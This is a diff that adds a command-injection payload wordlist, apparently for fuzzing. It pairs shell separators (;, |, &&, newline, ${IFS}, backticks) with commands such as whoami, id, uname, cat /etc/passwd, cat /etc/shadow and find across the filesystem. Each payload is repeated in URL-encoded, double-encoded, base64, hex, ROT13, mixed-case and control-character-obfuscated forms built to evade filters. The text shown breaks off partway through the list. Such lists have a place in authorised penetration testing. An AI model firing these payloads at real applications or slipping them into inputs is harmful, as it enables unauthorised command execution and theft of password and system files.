@@ -1,0 +1,2544 @@
+; id
+%3B%20id
+%253B%2520id
+OyBpZA==
+3b206964
+; vq
+; Id
+| id
+%7C%20id
+%257C%2520id
+fCBpZA==
+7c206964
+| vq
+| Id
+| i%20d
+|| id
+%7C%7C%20id
+%257C%257C%2520id
+fHwgaWQ=
+7c7c206964
+|| vq
+%0a|| id
+& id
+%26%20id
+%2526%2520id
+JiBpZA==
+26206964
+& vq
+& ID
+&& id
+%26%26%20id
+%2526%2526%2520id
+JiYgaWQ=
+2626206964
+&& vq
+&& Id
+%0aid
+%250aid
+%25250aid
+JTBhaWQ=
+2530616964
+%0nvq
+%0aID
+%0Aid
+%250Aid
+%25250Aid
+JTBBaWQ=
+2530416964
+%0Nvq
+%%0c0Aid
+${IFS}id
+%24%7BIFS%7Did
+%2524%257BIFS%257Did
+JHtJRlN9aWQ=
+247b4946537d6964
+${VSF}vq
+${iFs}iD
+\nid
+%5Cnid
+%255Cnid
+XG5pZA==
+5c6e6964
+\avq
+\nId
+id
+aWQ=
+6964
+vq
+; whoami
+%3B%20whoami
+%253B%2520whoami
+OyB3aG9hbWk=
+3b2077686f616d69
+; jubnzv
+; WhoaMi
+; whoa%0dm%09i
+| whoami
+%7C%20whoami
+%257C%2520whoami
+fCB3aG9hbWk=
+7c2077686f616d69
+| jubnzv
+| whOAmi
+|%0a %0awhoami
+|| whoami
+%7C%7C%20whoami
+%257C%257C%2520whoami
+fHwgd2hvYW1p
+7c7c2077686f616d69
+|| jubnzv
+|| WHoAmi
+& whoami
+%26%20whoami
+%2526%2520whoami
+JiB3aG9hbWk=
+262077686f616d69
+& jubnzv
+& WHoAMI
+& who%0bami
+&& whoami
+%26%26%20whoami
+%2526%2526%2520whoami
+JiYgd2hvYW1p
+26262077686f616d69
+&& jubnzv
+&& whoAmI
+&& whoam%20i
+%0awhoami
+%250awhoami
+%25250awhoami
+JTBhd2hvYW1p
+25306177686f616d69
+%0njubnzv
+%0AWHoAmi
+%0awhoa%20mi
+%0Awhoami
+%250Awhoami
+%25250Awhoami
+JTBBd2hvYW1p
+25304177686f616d69
+%0Njubnzv
+%0awHoAMI
+%0Awh%20oami
+${IFS}whoami
+%24%7BIFS%7Dwhoami
+%2524%257BIFS%257Dwhoami
+JHtJRlN9d2hvYW1p
+247b4946537d77686f616d69
+${VSF}jubnzv
+${iFS}whOAMi
+\nwhoami
+%5Cnwhoami
+%255Cnwhoami
+XG53aG9hbWk=
+5c6e77686f616d69
+\ajubnzv
+\NWhOamI
+whoami
+d2hvYW1p
+77686f616d69
+jubnzv
+whOAmI
+; uname -a
+%3B%20uname%20-a
+%253B%2520uname%2520-a
+OyB1bmFtZSAtYQ==
+3b20756e616d65202d61
+; hanzr -n
+; uNAME -a
+;%00 un%00a%20me -a
+| uname -a
+%7C%20uname%20-a
+%257C%2520uname%2520-a
+fCB1bmFtZSAtYQ==
+7c20756e616d65202d61
+| hanzr -n
+| UNAMe -a
+| una%09me -a
+|| uname -a
+%7C%7C%20uname%20-a
+%257C%257C%2520uname%2520-a
+fHwgdW5hbWUgLWE=
+7c7c20756e616d65202d61
+|| hanzr -n
+|| unaMe -a
+|%0c| uname -a
+& uname -a
+%26%20uname%20-a
+%2526%2520uname%2520-a
+JiB1bmFtZSAtYQ==
+2620756e616d65202d61
+& hanzr -n
+& UnAMe -a
+& unam%0be -a
+&& uname -a
+%26%26%20uname%20-a
+%2526%2526%2520uname%2520-a
+JiYgdW5hbWUgLWE=
+262620756e616d65202d61
+&& hanzr -n
+&& unAme -a
+&%0d& uname -a
+%0auname -a
+%250auname%20-a
+%25250auname%2520-a
+JTBhdW5hbWUgLWE=
+253061756e616d65202d61
+%0nhanzr -n
+%0aUnaMe -a
+%0b%0aunam%0be -a
+%0Auname -a
+%250Auname%20-a
+%25250Auname%2520-a
+JTBBdW5hbWUgLWE=
+253041756e616d65202d61
+%0Nhanzr -n
+%0AUname -A
+%0%20Auname -a
+${IFS}uname -a
+%24%7BIFS%7Duname%20-a
+%2524%257BIFS%257Duname%2520-a
+JHtJRlN9dW5hbWUgLWE=
+247b4946537d756e616d65202d61
+${VSF}hanzr -n
+${ifS}unamE -a
+\nuname -a
+%5Cnuname%20-a
+%255Cnuname%2520-a
+XG51bmFtZSAtYQ==
+5c6e756e616d65202d61
+\ahanzr -n
+\NUnAmE -a
+%0c\nuname -a
+uname -a
+uname%20-a
+uname%2520-a
+dW5hbWUgLWE=
+756e616d65202d61
+hanzr -n
+uNAmE -a
+u%0bna%0bm%0de %00-a
+; pwd
+%3B%20pwd
+%253B%2520pwd
+OyBwd2Q=
+3b20707764
+; cjq
+; pWD
+%09; pwd
+| pwd
+%7C%20pwd
+%257C%2520pwd
+fCBwd2Q=
+7c20707764
+| cjq
+| pwD
+|| pwd
+%7C%7C%20pwd
+%257C%257C%2520pwd
+fHwgcHdk
+7c7c20707764
+|| cjq
+|| PWD
+%0d|%20| pwd
+& pwd
+%26%20pwd
+%2526%2520pwd
+JiBwd2Q=
+2620707764
+& cjq
+& PWD
+&& pwd
+%26%26%20pwd
+%2526%2526%2520pwd
+JiYgcHdk
+262620707764
+&& cjq
+&& PWD
+&& p%20wd
+%0apwd
+%250apwd
+%25250apwd
+JTBhcHdk
+253061707764
+%0ncjq
+%0ApWd
+%%0c0apwd
+%0Apwd
+%250Apwd
+%25250Apwd
+JTBBcHdk
+253041707764
+%0Ncjq
+%0APWd
+%0A%00pw%0cd
+${IFS}pwd
+%24%7BIFS%7Dpwd
+%2524%257BIFS%257Dpwd
+JHtJRlN9cHdk
+247b4946537d707764
+${VSF}cjq
+${iFS}PWD
+\npwd
+%5Cnpwd
+%255Cnpwd
+XG5wd2Q=
+5c6e707764
+\acjq
+\nPWd
+\%0dnpwd
+pwd
+cHdk
+707764
+cjq
+pWd
+; ls -la
+%3B%20ls%20-la
+%253B%2520ls%2520-la
+OyBscyAtbGE=
+3b206c73202d6c61
+; yf -yn
+; ls -La
+;%20 ls -la
+| ls -la
+%7C%20ls%20-la
+%257C%2520ls%2520-la
+fCBscyAtbGE=
+7c206c73202d6c61
+| yf -yn
+| Ls -LA
+| %00ls -la
+|| ls -la
+%7C%7C%20ls%20-la
+%257C%257C%2520ls%2520-la
+fHwgbHMgLWxh
+7c7c206c73202d6c61
+|| yf -yn
+|| Ls -lA
+|| ls -l%0ba
+& ls -la
+%26%20ls%20-la
+%2526%2520ls%2520-la
+JiBscyAtbGE=
+26206c73202d6c61
+& yf -yn
+& lS -La
+&& ls -la
+%26%26%20ls%20-la
+%2526%2526%2520ls%2520-la
+JiYgbHMgLWxh
+2626206c73202d6c61
+&& yf -yn
+&& ls -lA
+&& l%0as -la
+%0als -la
+%250als%20-la
+%25250als%2520-la
+JTBhbHMgLWxh
+2530616c73202d6c61
+%0nyf -yn
+%0ALS -LA
+%0als %0d-la
+%0Als -la
+%250Als%20-la
+%25250Als%2520-la
+JTBBbHMgLWxh
+2530416c73202d6c61
+%0Nyf -yn
+%0Als -LA
+${IFS}ls -la
+%24%7BIFS%7Dls%20-la
+%2524%257BIFS%257Dls%2520-la
+JHtJRlN9bHMgLWxh
+247b4946537d6c73202d6c61
+${VSF}yf -yn
+${iFs}Ls -lA
+${IFS}%0dls -la
+\nls -la
+%5Cnls%20-la
+%255Cnls%2520-la
+XG5scyAtbGE=
+5c6e6c73202d6c61
+\ayf -yn
+\nlS -la
+ls -la
+ls%20-la
+ls%2520-la
+bHMgLWxh
+6c73202d6c61
+yf -yn
+lS -LA
+; ps aux
+%3B%20ps%20aux
+%253B%2520ps%2520aux
+OyBwcyBhdXg=
+3b20707320617578
+; cf nhk
+; PS aux
+| ps aux
+%7C%20ps%20aux
+%257C%2520ps%2520aux
+fCBwcyBhdXg=
+7c20707320617578
+| cf nhk
+| pS Aux
+|%0a ps aux
+|| ps aux
+%7C%7C%20ps%20aux
+%257C%257C%2520ps%2520aux
+fHwgcHMgYXV4
+7c7c20707320617578
+|| cf nhk
+|| Ps aux
+|%0b| ps aux
+& ps aux
+%26%20ps%20aux
+%2526%2520ps%2520aux
+JiBwcyBhdXg=
+2620707320617578
+& cf nhk
+& pS AuX
+&& ps aux
+%26%26%20ps%20aux
+%2526%2526%2520ps%2520aux
+JiYgcHMgYXV4
+262620707320617578
+&& cf nhk
+&& PS aUX
+&& ps au%09x
+%0aps aux
+%250aps%20aux
+%25250aps%2520aux
+JTBhcHMgYXV4
+253061707320617578
+%0ncf nhk
+%0b%0aps aux
+%0Aps aux
+%250Aps%20aux
+%25250Aps%2520aux
+JTBBcHMgYXV4
+253041707320617578
+%0Ncf nhk
+%0Aps aUX
+${IFS}ps aux
+%24%7BIFS%7Dps%20aux
+%2524%257BIFS%257Dps%2520aux
+JHtJRlN9cHMgYXV4
+247b4946537d707320617578
+${VSF}cf nhk
+${Ifs}pS aUX
+$%20{IFS}ps aux
+\nps aux
+%5Cnps%20aux
+%255Cnps%2520aux
+XG5wcyBhdXg=
+5c6e707320617578
+\acf nhk
+\NpS aux
+\nps a%00ux
+ps aux
+ps%20aux
+ps%2520aux
+cHMgYXV4
+707320617578
+cf nhk
+pS aux
+&whoami
+%26whoami
+%2526whoami
+Jndob2FtaQ==
+2677686f616d69
+&jubnzv
+&whOamI
+|whoami
+%7Cwhoami
+%257Cwhoami
+fHdob2FtaQ==
+7c77686f616d69
+|jubnzv
+|WhoAMI
+|w%00hoami
+%252526whoami
+JTI2d2hvYW1p
+25323677686f616d69
+%26jubnzv
+%26wHOAmi
+%25257Cwhoami
+JTdDd2hvYW1p
+25374377686f616d69
+%7Pjubnzv
+%7CwHoAMi
+`|whoami
+%60%7Cwhoami
+%2560%257Cwhoami
+YHx3aG9hbWk=
+607c77686f616d69
+`|jubnzv
+`|WhoAMi
+`|wh%0doami
+`&whoami
+%60%26whoami
+%2560%2526whoami
+YCZ3aG9hbWk=
+602677686f616d69
+`&jubnzv
+`&whoamI
+`&whoa%09mi
+WhoAMI
+&ver
+%26ver
+%2526ver
+JnZlcg==
+26766572
+&ire
+&VER
+|ver
+%7Cver
+%257Cver
+fHZlcg==
+7c766572
+|ire
+|vEr
+|v%0cer
+%252526ver
+JTI2dmVy
+253236766572
+%26ire
+%26VEr
+%%0a26ver
+%25257Cver
+JTdDdmVy
+253743766572
+%7Pire
+%7cVeR
+%7C%0aver
+`|ver
+%60%7Cver
+%2560%257Cver
+YHx2ZXI=
+607c766572
+`|ire
+`&ver
+%60%26ver
+%2560%2526ver
+YCZ2ZXI=
+6026766572
+`&ire
+ver
+dmVy
+766572
+ire
+veR
+ve%20r
+&dir
+%26dir
+%2526dir
+JmRpcg==
+26646972
+&qve
+|dir
+%7Cdir
+%257Cdir
+fGRpcg==
+7c646972
+|qve
+%0b|di%0dr
+%252526dir
+JTI2ZGly
+253236646972
+%26qve
+%26DIr
+%25257Cdir
+JTdDZGly
+253743646972
+%7Pqve
+%7CdIr
+%0c%%0a7Cdir
+`|dir
+%60%7Cdir
+%2560%257Cdir
+YHxkaXI=
+607c646972
+`|qve
+`|dIr
+%0c`%09|dir
+`&dir
+%60%26dir
+%2560%2526dir
+YCZkaXI=
+6026646972
+`&qve
+`&DIR
+`&%0cd%09i%0ar
+dir
+ZGly
+646972
+qve
+Dir
+&tasklist
+%26tasklist
+%2526tasklist
+JnRhc2tsaXN0
+267461736b6c697374
+&gnfxyvfg
+&TaSkLiSt
+|tasklist
+%7Ctasklist
+%257Ctasklist
+fHRhc2tsaXN0
+7c7461736b6c697374
+|gnfxyvfg
+|TASkLiST
+%252526tasklist
+JTI2dGFza2xpc3Q=
+2532367461736b6c697374
+%26gnfxyvfg
+%26TAskliSt
+%26t%0baskli%20st
+%25257Ctasklist
+JTdDdGFza2xpc3Q=
+2537437461736b6c697374
+%7Pgnfxyvfg
+%7ctasKLISt
+%7Ctask%0blist
+`|tasklist
+%60%7Ctasklist
+%2560%257Ctasklist
+YHx0YXNrbGlzdA==
+607c7461736b6c697374
+`|gnfxyvfg
+`|TASKlIst
+`&tasklist
+%60%26tasklist
+%2560%2526tasklist
+YCZ0YXNrbGlzdA==
+60267461736b6c697374
+`&gnfxyvfg
+`&TAsKLisT
+%20`&tasklist
+tasklist
+dGFza2xpc3Q=
+7461736b6c697374
+gnfxyvfg
+TasklIsT
+&ipconfig
+%26ipconfig
+%2526ipconfig
+JmlwY29uZmln
+266970636f6e666967
+&vcpbasvt
+&IpCoNfig
+&%0cipcon%0afi%0ag
+|ipconfig
+%7Cipconfig
+%257Cipconfig
+fGlwY29uZmln
+7c6970636f6e666967
+|vcpbasvt
+|IpcoNfiG
+|%09i%0dpconfig
+%252526ipconfig
+JTI2aXBjb25maWc=
+2532366970636f6e666967
+%26vcpbasvt
+%26iPCoNFiG
+%25257Cipconfig
+JTdDaXBjb25maWc=
+2537436970636f6e666967
+%7Pvcpbasvt
+%7CIPCoNfiG
+%7Cipconf%0ai%20g
+`|ipconfig
+%60%7Cipconfig
+%2560%257Cipconfig
+YHxpcGNvbmZpZw==
+607c6970636f6e666967
+`|vcpbasvt
+`|IpcoNFIg
+`&ipconfig
+%60%26ipconfig
+%2560%2526ipconfig
+YCZpcGNvbmZpZw==
+60266970636f6e666967
+`&vcpbasvt
+`&IPCOnFiG
+ipconfig
+aXBjb25maWc=
+6970636f6e666967
+vcpbasvt
+iPcoNFiG
+ipconf%20ig
+; cat /etc/passwd
+%3B%20cat%20/etc/passwd
+%253B%2520cat%2520/etc/passwd
+OyBjYXQgL2V0Yy9wYXNzd2Q=
+3b20636174202f6574632f706173737764
+; png /rgp/cnffjq
+; CaT /eTC/PAssWd
+| cat /etc/passwd
+%7C%20cat%20/etc/passwd
+%257C%2520cat%2520/etc/passwd
+fCBjYXQgL2V0Yy9wYXNzd2Q=
+7c20636174202f6574632f706173737764
+| png /rgp/cnffjq
+| cAT /ETC/pASsWd
+|| cat /etc/passwd
+%7C%7C%20cat%20/etc/passwd
+%257C%257C%2520cat%2520/etc/passwd
+fHwgY2F0IC9ldGMvcGFzc3dk
+7c7c20636174202f6574632f706173737764
+|| png /rgp/cnffjq
+|| Cat /etC/pAssWd
+|%0a| c%00at /etc/passwd
+& cat /etc/passwd
+%26%20cat%20/etc/passwd
+%2526%2520cat%2520/etc/passwd
+JiBjYXQgL2V0Yy9wYXNzd2Q=
+2620636174202f6574632f706173737764
+& png /rgp/cnffjq
+& cAt /etc/passWD
+& %00c%0bat /etc/pas%0dswd
+&& cat /etc/passwd
+%26%26%20cat%20/etc/passwd
+%2526%2526%2520cat%2520/etc/passwd
+JiYgY2F0IC9ldGMvcGFzc3dk
+262620636174202f6574632f706173737764
+&& png /rgp/cnffjq
+&& caT /eTc/passwD
+&& cat /etc%0d/passw%0dd
+%0acat /etc/passwd
+%250acat%20/etc/passwd
+%25250acat%2520/etc/passwd
+JTBhY2F0IC9ldGMvcGFzc3dk
+253061636174202f6574632f706173737764
+%0npng /rgp/cnffjq
+%0AcAt /Etc/PaSsWD
+%0%20acat /etc/passwd
+%0Acat /etc/passwd
+%250Acat%20/etc/passwd
+%25250Acat%2520/etc/passwd
+JTBBY2F0IC9ldGMvcGFzc3dk
+253041636174202f6574632f706173737764
+%0Npng /rgp/cnffjq
+%0AcAt /ETC/PASsWd
+%0%0aAcat%09 /etc/%0cpasswd
+${IFS}cat /etc/passwd
+%24%7BIFS%7Dcat%20/etc/passwd
+%2524%257BIFS%257Dcat%2520/etc/passwd
+JHtJRlN9Y2F0IC9ldGMvcGFzc3dk
+247b4946537d636174202f6574632f706173737764
+${VSF}png /rgp/cnffjq
+${iFS}CaT /EtC/pASSwD
+\ncat /etc/passwd
+%5Cncat%20/etc/passwd
+%255Cncat%2520/etc/passwd
+XG5jYXQgL2V0Yy9wYXNzd2Q=
+5c6e636174202f6574632f706173737764
+\apng /rgp/cnffjq
+\ncAT /eTC/PASswD
+\ncat%0d /etc/passwd
+cat /etc/passwd
+cat%20/etc/passwd
+cat%2520/etc/passwd
+Y2F0IC9ldGMvcGFzc3dk
+636174202f6574632f706173737764
+png /rgp/cnffjq
+CaT /etC/paSswD
+; cat /etc/shadow
+%3B%20cat%20/etc/shadow
+%253B%2520cat%2520/etc/shadow
+OyBjYXQgL2V0Yy9zaGFkb3c=
+3b20636174202f6574632f736861646f77
+; png /rgp/funqbj
+; cAT /EtC/sHADoW
+; c%0aat /etc/shadow
+| cat /etc/shadow
+%7C%20cat%20/etc/shadow
+%257C%2520cat%2520/etc/shadow
+fCBjYXQgL2V0Yy9zaGFkb3c=
+7c20636174202f6574632f736861646f77
+| png /rgp/funqbj
+| cAT /Etc/ShadOW
+|| cat /etc/shadow
+%7C%7C%20cat%20/etc/shadow
+%257C%257C%2520cat%2520/etc/shadow
+fHwgY2F0IC9ldGMvc2hhZG93
+7c7c20636174202f6574632f736861646f77
+|| png /rgp/funqbj
+|| CAT /etc/ShaDoW
+|%09| cat /%0bet%00c/shadow
+& cat /etc/shadow
+%26%20cat%20/etc/shadow
+%2526%2520cat%2520/etc/shadow
+JiBjYXQgL2V0Yy9zaGFkb3c=
+2620636174202f6574632f736861646f77
+& png /rgp/funqbj
+& CAT /EtC/sHADOW
+& cat%0a /etc/%0ashadow
+&& cat /etc/shadow
+%26%26%20cat%20/etc/shadow
+%2526%2526%2520cat%2520/etc/shadow
+JiYgY2F0IC9ldGMvc2hhZG93
+262620636174202f6574632f736861646f77
+&& png /rgp/funqbj
+&& cAt /Etc/ShaDoW
+%0b&& %0dcat%0d /etc/%20shadow
+%0acat /etc/shadow
+%250acat%20/etc/shadow
+%25250acat%2520/etc/shadow
+JTBhY2F0IC9ldGMvc2hhZG93
+253061636174202f6574632f736861646f77
+%0npng /rgp/funqbj
+%0Acat /EtC/SHAdow
+%0acat %0b/etc%09/shadow
+%0Acat /etc/shadow
+%250Acat%20/etc/shadow
+%25250Acat%2520/etc/shadow
+JTBBY2F0IC9ldGMvc2hhZG93
+253041636174202f6574632f736861646f77
+%0Npng /rgp/funqbj
+%0AcaT /eTc/SHADOW
+%0Ac%0cat /%0cetc/shado%0aw
+${IFS}cat /etc/shadow
+%24%7BIFS%7Dcat%20/etc/shadow
+%2524%257BIFS%257Dcat%2520/etc/shadow
+JHtJRlN9Y2F0IC9ldGMvc2hhZG93
+247b4946537d636174202f6574632f736861646f77
+${VSF}png /rgp/funqbj
+${IfS}cAT /etC/shAdow
+%00$%09{IFS}%00cat /e%0atc/shad%0aow
+\ncat /etc/shadow
+%5Cncat%20/etc/shadow
+%255Cncat%2520/etc/shadow
+XG5jYXQgL2V0Yy9zaGFkb3c=
+5c6e636174202f6574632f736861646f77
+\apng /rgp/funqbj
+\ncAt /Etc/ShaDow
+\ncat %0c/e%20tc/shadow
+cat /etc/shadow
+cat%20/etc/shadow
+cat%2520/etc/shadow
+Y2F0IC9ldGMvc2hhZG93
+636174202f6574632f736861646f77
+png /rgp/funqbj
+CaT /eTC/SHadOW
+cat /e%0btc/shadow
+; head -n 10 /etc/passwd
+%3B%20head%20-n%2010%20/etc/passwd
+%253B%2520head%2520-n%252010%2520/etc/passwd
+OyBoZWFkIC1uIDEwIC9ldGMvcGFzc3dk
+3b2068656164202d6e203130202f6574632f706173737764
+; urnq -a 10 /rgp/cnffjq
+; HEAd -n 10 /ETc/passWd
+; head%0c -n 10 /etc/passwd
+| head -n 10 /etc/passwd
+%7C%20head%20-n%2010%20/etc/passwd
+%257C%2520head%2520-n%252010%2520/etc/passwd
+fCBoZWFkIC1uIDEwIC9ldGMvcGFzc3dk
+7c2068656164202d6e203130202f6574632f706173737764
+| urnq -a 10 /rgp/cnffjq
+| HeAD -n 10 /etC/pAssWD
+| head -n 10 /e%00tc/passwd
+|| head -n 10 /etc/passwd
+%7C%7C%20head%20-n%2010%20/etc/passwd
+%257C%257C%2520head%2520-n%252010%2520/etc/passwd
+fHwgaGVhZCAtbiAxMCAvZXRjL3Bhc3N3ZA==
+7c7c2068656164202d6e203130202f6574632f706173737764
+|| urnq -a 10 /rgp/cnffjq
+|| HeAD -N 10 /ETc/PAsSwD
+|| head -%0dn 10 /e%09tc/passwd
+& head -n 10 /etc/passwd
+%26%20head%20-n%2010%20/etc/passwd
+%2526%2520head%2520-n%252010%2520/etc/passwd
+JiBoZWFkIC1uIDEwIC9ldGMvcGFzc3dk
+262068656164202d6e203130202f6574632f706173737764
+& urnq -a 10 /rgp/cnffjq
+& heAd -N 10 /eTC/pAsswd
+& h%09ead -n 10 /etc/passwd
+&& head -n 10 /etc/passwd
+%26%26%20head%20-n%2010%20/etc/passwd
+%2526%2526%2520head%2520-n%252010%2520/etc/passwd
+JiYgaGVhZCAtbiAxMCAvZXRjL3Bhc3N3ZA==
+26262068656164202d6e203130202f6574632f706173737764
+&& urnq -a 10 /rgp/cnffjq
+&& HeAD -N 10 /etC/paSSwD
+&& h%0aea%0cd -n 10 /etc/pas%0dswd
+%0ahead -n 10 /etc/passwd
+%250ahead%20-n%2010%20/etc/passwd
+%25250ahead%2520-n%252010%2520/etc/passwd
+JTBhaGVhZCAtbiAxMCAvZXRjL3Bhc3N3ZA==
+25306168656164202d6e203130202f6574632f706173737764
+%0nurnq -a 10 /rgp/cnffjq
+%0ahEAd -N 10 /ETc/PasSWd
+%0ahea%09d -n 1%0d0 /%0detc/p%20a%00sswd
+%0Ahead -n 10 /etc/passwd
+%250Ahead%20-n%2010%20/etc/passwd
+%25250Ahead%2520-n%252010%2520/etc/passwd
+JTBBaGVhZCAtbiAxMCAvZXRjL3Bhc3N3ZA==
+25304168656164202d6e203130202f6574632f706173737764
+%0Nurnq -a 10 /rgp/cnffjq
+%0AheaD -n 10 /EtC/PAssWD
+%%0c0Ahead -n 10 /%20etc/%0bpasswd
+${IFS}head -n 10 /etc/passwd
+%24%7BIFS%7Dhead%20-n%2010%20/etc/passwd
+%2524%257BIFS%257Dhead%2520-n%252010%2520/etc/passwd
+JHtJRlN9aGVhZCAtbiAxMCAvZXRjL3Bhc3N3ZA==
+247b4946537d68656164202d6e203130202f6574632f706173737764
+${VSF}urnq -a 10 /rgp/cnffjq
+${iFs}HeaD -N 10 /ETc/PasSWd
+%09${%00IFS}head -n 10 /%0betc%0c/pas%00swd
+\nhead -n 10 /etc/passwd
+%5Cnhead%20-n%2010%20/etc/passwd
+%255Cnhead%2520-n%252010%2520/etc/passwd
+XG5oZWFkIC1uIDEwIC9ldGMvcGFzc3dk
+5c6e68656164202d6e203130202f6574632f706173737764
+\aurnq -a 10 /rgp/cnffjq
+\NHEAD -N 10 /EtC/PAsswD
+\nhead -%0an 1%0c0 /e%00tc/passwd
+head -n 10 /etc/passwd
+head%20-n%2010%20/etc/passwd
+head%2520-n%252010%2520/etc/passwd
+aGVhZCAtbiAxMCAvZXRjL3Bhc3N3ZA==
+68656164202d6e203130202f6574632f706173737764
+urnq -a 10 /rgp/cnffjq
+HeaD -N 10 /EtC/pAssWd
+head%00 -n 10 /et%00c/p%20asswd
+; tail -f /var/log/syslog
+%3B%20tail%20-f%20/var/log/syslog
+%253B%2520tail%2520-f%2520/var/log/syslog
+OyB0YWlsIC1mIC92YXIvbG9nL3N5c2xvZw==
+3b207461696c202d66202f7661722f6c6f672f7379736c6f67
+; gnvy -s /ine/ybt/flfybt
+; Tail -F /vaR/LOg/sYsloG
+%0c; tail -f /%20var/log/sys%20log
+| tail -f /var/log/syslog
+%7C%20tail%20-f%20/var/log/syslog
+%257C%2520tail%2520-f%2520/var/log/syslog
+fCB0YWlsIC1mIC92YXIvbG9nL3N5c2xvZw==
+7c207461696c202d66202f7661722f6c6f672f7379736c6f67
+| gnvy -s /ine/ybt/flfybt
+| taIl -F /vAr/log/syslOg
+%0c|%20 tail -f%20 /var/lo%0cg/%0bsyslog
+|| tail -f /var/log/syslog
+%7C%7C%20tail%20-f%20/var/log/syslog
+%257C%257C%2520tail%2520-f%2520/var/log/syslog
+fHwgdGFpbCAtZiAvdmFyL2xvZy9zeXNsb2c=
+7c7c207461696c202d66202f7661722f6c6f672f7379736c6f67
+|| gnvy -s /ine/ybt/flfybt
+|| TAiL -F /VAR/loG/SysLOg
+|| %0ctail -f /var/log/syslog
+& tail -f /var/log/syslog
+%26%20tail%20-f%20/var/log/syslog
+%2526%2520tail%2520-f%2520/var/log/syslog
+JiB0YWlsIC1mIC92YXIvbG9nL3N5c2xvZw==
+26207461696c202d66202f7661722f6c6f672f7379736c6f67
+& gnvy -s /ine/ybt/flfybt
+& TaiL -F /vAR/LOG/SYSlOG
+%00&%20 tail -f /var/log/syslog
+&& tail -f /var/log/syslog
+%26%26%20tail%20-f%20/var/log/syslog
+%2526%2526%2520tail%2520-f%2520/var/log/syslog
+JiYgdGFpbCAtZiAvdmFyL2xvZy9zeXNsb2c=
+2626207461696c202d66202f7661722f6c6f672f7379736c6f67
+&& gnvy -s /ine/ybt/flfybt
+&& TAIL -F /vAr/LOg/SYSlOG
+&& %09tail -f /va%0dr/log/sysl%0cog
+%0atail -f /var/log/syslog
+%250atail%20-f%20/var/log/syslog
+%25250atail%2520-f%2520/var/log/syslog
+JTBhdGFpbCAtZiAvdmFyL2xvZy9zeXNsb2c=
+2530617461696c202d66202f7661722f6c6f672f7379736c6f67
+%0ngnvy -s /ine/ybt/flfybt
+%0AtAiL -F /var/log/syslOg
+%0atail -f /v%0dar/l%20og/sysl%20og
+%0Atail -f /var/log/syslog
+%250Atail%20-f%20/var/log/syslog
+%25250Atail%2520-f%2520/var/log/syslog
+JTBBdGFpbCAtZiAvdmFyL2xvZy9zeXNsb2c=
+2530417461696c202d66202f7661722f6c6f672f7379736c6f67
+%0Ngnvy -s /ine/ybt/flfybt
+%0AtaIL -f /vAr/loG/SysLOG
+%0Atai%0dl -f /v%0aar/log/syslog
+${IFS}tail -f /var/log/syslog
+%24%7BIFS%7Dtail%20-f%20/var/log/syslog
+%2524%257BIFS%257Dtail%2520-f%2520/var/log/syslog
+JHtJRlN9dGFpbCAtZiAvdmFyL2xvZy9zeXNsb2c=
+247b4946537d7461696c202d66202f7661722f6c6f672f7379736c6f67
+${VSF}gnvy -s /ine/ybt/flfybt
+${iFs}taIl -F /VAR/lOg/sYsLog
+%00${IFS}tail -f%20 /var/%00log/%0dsysl%0bog
+\ntail -f /var/log/syslog
+%5Cntail%20-f%20/var/log/syslog
+%255Cntail%2520-f%2520/var/log/syslog
+XG50YWlsIC1mIC92YXIvbG9nL3N5c2xvZw==
+5c6e7461696c202d66202f7661722f6c6f672f7379736c6f67
+\agnvy -s /ine/ybt/flfybt
+\nTAiL -F /var/lOg/SysLoG
+\%0bntail -%0df /va%0dr/log%09/syslog
+tail -f /var/log/syslog
+tail%20-f%20/var/log/syslog
+tail%2520-f%2520/var/log/syslog
+dGFpbCAtZiAvdmFyL2xvZy9zeXNsb2c=
+7461696c202d66202f7661722f6c6f672f7379736c6f67
+gnvy -s /ine/ybt/flfybt
+tAIL -f /Var/Log/SyslOG
+ta%09il%0d -f %0d/var/log%0a/%09syslog
+; find / -name '*.conf' -type f 2>/dev/null
+%3B%20find%20/%20-name%20%27%2A.conf%27%20-type%20f%202%3E/dev/null
+%253B%2520find%2520/%2520-name%2520%2527%252A.conf%2527%2520-type%2520f%25202%253E/dev/null
+OyBmaW5kIC8gLW5hbWUgJyouY29uZicgLXR5cGUgZiAyPi9kZXYvbnVsbA==
+3b2066696e64202f202d6e616d6520272a2e636f6e6627202d74797065206620323e2f6465762f6e756c6c
+; svaq / -anzr '*.pbas' -glcr s 2>/qri/ahyy
+; FINd / -name '*.conF' -tyPE f 2>/dev/NulL
+; find / -name '*.con%00f' -%0ctyp%0de %20f 2>/dev/null
+| find / -name '*.conf' -type f 2>/dev/null
+%7C%20find%20/%20-name%20%27%2A.conf%27%20-type%20f%202%3E/dev/null
+%257C%2520find%2520/%2520-name%2520%2527%252A.conf%2527%2520-type%2520f%25202%253E/dev/null
+fCBmaW5kIC8gLW5hbWUgJyouY29uZicgLXR5cGUgZiAyPi9kZXYvbnVsbA==
+7c2066696e64202f202d6e616d6520272a2e636f6e6627202d74797065206620323e2f6465762f6e756c6c
+| svaq / -anzr '*.pbas' -glcr s 2>/qri/ahyy
+| fIND / -namE '*.conF' -TyPe f 2>/dEV/NuLl
+| find / %20-%0bname '*.conf' -type f 2>/dev/nul%0cl
+|| find / -name '*.conf' -type f 2>/dev/null
+%7C%7C%20find%20/%20-name%20%27%2A.conf%27%20-type%20f%202%3E/dev/null
+%257C%257C%2520find%2520/%2520-name%2520%2527%252A.conf%2527%2520-type%2520f%25202%253E/dev/null
+fHwgZmluZCAvIC1uYW1lICcqLmNvbmYnIC10eXBlIGYgMj4vZGV2L251bGw=
+7c7c2066696e64202f202d6e616d6520272a2e636f6e6627202d74797065206620323e2f6465762f6e756c6c
+|| svaq / -anzr '*.pbas' -glcr s 2>/qri/ahyy
+|| find / -nAmE '*.coNf' -tYPe F 2>/DEv/NuLL
+|%20| f%0aind%0a /%09 -name '*%0c.%09conf%20' -type f 2>%0d/dev/nu%0all
+& find / -name '*.conf' -type f 2>/dev/null
+%26%20find%20/%20-name%20%27%2A.conf%27%20-type%20f%202%3E/dev/null
+%2526%2520find%2520/%2520-name%2520%2527%252A.conf%2527%2520-type%2520f%25202%253E/dev/null
+JiBmaW5kIC8gLW5hbWUgJyouY29uZicgLXR5cGUgZiAyPi9kZXYvbnVsbA==
+262066696e64202f202d6e616d6520272a2e636f6e6627202d74797065206620323e2f6465762f6e756c6c
+& svaq / -anzr '*.pbas' -glcr s 2>/qri/ahyy
+& fiND / -NAme '*.cOnF' -TYPE F 2>/dEv/NULl
+& fin%09d %0d/ -name '*%00.conf' -type f%0d 2%00>/dev/n%00ull
+&& find / -name '*.conf' -type f 2>/dev/null
+%26%26%20find%20/%20-name%20%27%2A.conf%27%20-type%20f%202%3E/dev/null
